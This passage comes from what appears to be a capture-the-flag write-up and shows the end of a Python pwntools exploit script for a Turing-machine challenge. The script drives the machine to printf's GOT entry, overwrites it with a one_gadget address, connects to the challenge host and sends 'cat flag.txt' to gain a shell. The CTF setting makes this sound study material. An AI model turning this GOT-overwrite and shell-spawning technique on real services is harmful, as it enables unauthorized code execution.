        dot<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'  </span><span class="token interpolation"><span class="token punctuation">{</span>cur_state<span class="token punctuation">}</span></span><span class="token string"> -&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>next_state1<span class="token punctuation">}</span></span><span class="token string"> [label="</span><span class="token interpolation"><span class="token punctuation">{</span>label1<span class="token punctuation">}</span></span><span class="token string">"];'</span></span><span class="token punctuation">)</span>

    dot<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>
    <span class="token keyword keyword-return">return</span> <span class="token string">"\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>dot<span class="token punctuation">)</span>


<span class="token comment"># goto printf@got</span>
search_for<span class="token punctuation">(</span><span class="token number">0x6f000007</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>

<span class="token comment"># turn around</span>
transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Dir<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> k<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> Dir<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword keyword-for">for</span> k <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># overwrite printf address with one_gadget address by adding offset</span>
add_val<span class="token punctuation">(</span><span class="token number">0x8b64f</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token number">0x8b64f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment"># instead of the add_val above, one can do the following to safe a few states</span>
<span class="token comment"># this is equivalent to the operation above because the lowest 12bit of an address are not affected by ASLR.</span>
<span class="token comment"># write_val(0xd3f, 12, Dir.Right)</span>
<span class="token comment"># add_val(0x8b, 8)</span>

<span class="token comment"># padding, stop execution</span>
transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Dir<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> Dir<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">*</span> \
    <span class="token punctuation">(</span>NUM_STATE <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword keyword-assert">assert</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">==</span> NUM_STATE<span class="token punctuation">)</span>

<span class="token keyword keyword-with">with</span> remote<span class="token punctuation">(</span><span class="token string">"challs.nusgreyhats.org"</span><span class="token punctuation">,</span> <span class="token number">33103</span><span class="token punctuation">)</span> <span class="token keyword keyword-as">as</span> p<span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>
        <span class="token string">b"Enter the number of states you require (Max 100): "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>NUM_STATE<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Note: State 0 is reserved for the HALT state.\n"</span><span class="token punctuation">)</span>

    <span class="token keyword keyword-for">for</span> state_idx <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> NUM_STATE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># comment the following line in if you want to debug the transmission of states</span>
        <span class="token comment"># commented out for performance reasons</span>
        <span class="token comment"># p.recvuntil(f"State {state_idx}: ".encode())</span>

        trans_1<span class="token punctuation">,</span> trans_2 <span class="token operator">=</span> transitions<span class="token punctuation">[</span>state_idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword keyword-def">def</span> <span class="token function">format_transition</span><span class="token punctuation">(</span>transition<span class="token punctuation">)</span><span class="token punctuation">:</span>
            symbol<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> next_s <span class="token operator">=</span> transition
            <span class="token builtin">dir</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
            <span class="token keyword keyword-assert">assert</span> <span class="token punctuation">(</span>symbol <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword keyword-or">or</span> symbol <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword keyword-assert">assert</span> <span class="token punctuation">(</span>next_s <span class="token operator">&lt;=</span> NUM_STATE<span class="token punctuation">)</span>

            <span class="token keyword keyword-return">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>symbol<span class="token punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">dir</span><span class="token punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">{</span>next_s<span class="token punctuation">}</span></span><span class="token string">"</span></span>

        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>
            <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>format_transition<span class="token punctuation">(</span>trans_1<span class="token punctuation">)</span><span class="token punctuation">,</span> format_transition<span class="token punctuation">(</span>trans_2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Running your machine...\n"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"cat flag.txt"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
      </div>
      
      
    
    
    
    
    
    
  
    </body></html>